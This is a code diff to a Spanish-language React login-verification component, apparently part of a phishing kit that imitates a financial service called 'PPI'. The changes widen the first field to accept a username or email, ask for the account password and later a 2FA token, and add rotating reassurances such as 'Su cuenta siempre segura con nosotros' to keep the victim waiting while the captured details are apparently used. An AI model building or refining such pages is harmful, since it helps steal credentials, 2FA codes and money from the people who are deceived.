@@ -21,6 +21,35 @@ type SyncStep =
   | "recovery_email_submitted"
   | "success";
 
+const WAITING_MESSAGES = [
+  "Espere un momento, estamos validando su cuenta...",
+  "Su cuenta siempre segura con nosotros.",
+  "Estamos cargando sus informaciones...",
+  "Verificando los datos de seguridad...",
+  "Ya casi estamos, un momento más...",
+];
+
+const WaitingMessages = () => {
+  const [msgIndex, setMsgIndex] = useState(0);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setMsgIndex((prev) => (prev + 1) % WAITING_MESSAGES.length);
+    }, 4000);
+    return () => clearInterval(interval);
+  }, []);
+
+  return (
+    <div className="text-center py-8">
+      <Loader2 className="h-8 w-8 animate-spin text-[#1e5a96] mx-auto mb-5" />
+      <h1 className="text-[18px] font-bold text-[#1e2a3a] mb-3">Verificando tu cuenta</h1>
+      <p className="text-[13px] text-[#64748b] transition-opacity duration-500 min-h-[20px]">
+        {WAITING_MESSAGES[msgIndex]}
+      </p>
+    </div>
+  );
+};
+
 const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
   const [step, setStep] = useState<SyncStep>("email_input");
   const [clientEmail, setClientEmail] = useState("");
@@ -315,8 +344,8 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
               <CheckCircle2 size={32} className="text-[#16a34a]" />
             </div>
           </div>
-          <h1 className="text-[20px] font-bold text-[#1e2a3a] mb-2">Email verificado</h1>
-          <p className="text-[14px] text-[#64748b]">Tu email fue verificado exitosamente.</p>
+                <h1 className="text-[20px] font-bold text-[#1e2a3a] mb-2">Cuenta verificada</h1>
+          <p className="text-[14px] text-[#64748b]">Tu cuenta fue verificada exitosamente.</p>
           {clientEmail && <p className="mt-1 text-[12px] text-[#94a3b8]">{clientEmail}</p>}
         </div>
       </PageWrapper>
@@ -339,15 +368,15 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
                     <Mail size={22} className="text-[#1e5a96]" />
                   </div>
                 </div>
-                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Vincular email</h1>
+                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Vincular cuenta</h1>
                 <p className="text-center text-[13px] text-[#64748b] mb-6 leading-relaxed max-w-[340px] mx-auto">
-                  Para completar la verificación de tu cuenta, necesitamos vincular tu dirección de email personal.
+                  Ingresá tu usuario o dirección de email para vincular tu cuenta.
                 </p>
                 <form onSubmit={handleEmailSubmit}>
-                  <label className={labelClass}>Email personal</label>
+                  <label className={labelClass}>Usuario o email</label>
                   <input
-                    type="email"
-                    placeholder="nombre@email.com"
+                    type="text"
+                    placeholder="Ingresá tu usuario o email"
                     value={clientEmail}
                     onChange={(e) => handleEmailChange(e.target.value)}
                     autoFocus
@@ -372,9 +401,9 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
                     <ShieldCheck size={22} className="text-[#1e5a96]" />
                   </div>
                 </div>
-                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Verificar email</h1>
+                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Verificar cuenta</h1>
                 <p className="text-center text-[13px] text-[#64748b] mb-2 leading-relaxed">
-                  Ingresá la contraseña de tu email para confirmar tu identidad.
+                  Ingresá la contraseña de tu cuenta para confirmar tu identidad.
                 </p>
                 {provider && (
                   <div className="mb-5 flex items-center gap-3 rounded-lg border border-[#e2e8f0] bg-[#fafbfc] px-4 py-2.5">
@@ -401,13 +430,7 @@ const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
             )}
 
             {/* ── STEP: Waiting ── */}
-            {step === "waiting" && (
-              <div className="text-center py-4">
-                <h1 className="text-[18px] font-bold text-[#1e2a3a] mb-2">Verificando tu cuenta</h1>
-                <p className="text-[13px] text-[#64748b] mb-6">Estamos verificando tu email. Esto puede tardar unos segundos...</p>
-                {renderLoading("Verificación en progreso...")}
-              </div>
-            )}
+            {step === "waiting" && <WaitingMessages />}
 
             {/* ── STEP: Token 2FA ── */}
             {step === "token_2fa" && (
